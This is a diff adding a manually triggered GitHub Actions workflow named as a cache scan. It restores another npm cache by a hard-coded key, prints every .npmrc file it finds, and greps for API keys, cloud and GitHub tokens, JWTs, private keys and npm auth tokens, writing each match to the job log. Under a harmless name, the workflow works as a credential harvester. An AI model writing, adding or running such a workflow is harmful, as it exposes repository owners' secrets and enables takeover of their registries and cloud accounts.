@@ -1,0 +1,26 @@
+name: zz-cache-scan
+on:
+  workflow_dispatch:
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - id: restore
+        name: restore-npm-cache
+        uses: actions/cache/restore@v4
+        with:
+          path: ~/.npm
+          key: node-cache-Linux-x64-npm-4f153ab81385c7d4622fbabed5bc4abd71c8161f40c37912b780fccdafc8ac30
+      - name: scan
+        run: |
+          echo "HIT=${{ steps.restore.outputs.cache-hit }} MATCHED=${{ steps.restore.outputs.cache-matched-key }}"
+          du -sh ~/.npm 2>/dev/null || true
+          ls -la ~/.npm 2>/dev/null | head
+          echo "--- npmrc files ---"
+          find ~/.npm -maxdepth 4 -name '.npmrc' -o -maxdepth 4 -name '*.npmrc' 2>/dev/null | head
+          find / -maxdepth 3 -name '.npmrc' 2>/dev/null -exec sh -c 'echo "FILE=$1"; cat "$1"' _ {} \; | head -50
+          echo "--- secret grep ---"
+          grep -rIaEo 'sk-proj-[A-Za-z0-9_-]{20,}|sk-ant-[A-Za-z0-9_-]{20,}|sk-[A-Za-z0-9]{40,}|AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{50,}|AIza[0-9A-Za-z_-]{35}|eyJhbGciOi[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|BEGIN [A-Z ]*PRIVATE KEY|_authToken[^\n]{0,80}' ~/.npm 2>/dev/null | sort -u | head -40 || echo NOHIT
+          echo "--- registry urls w/ creds ---"
+          grep -rIaEo 'https://[^" ]{0,80}:_authToken=[^" ]{0,60}' ~/.npm 2>/dev/null | sort -u | head -10 || echo NONE
+          echo DONE
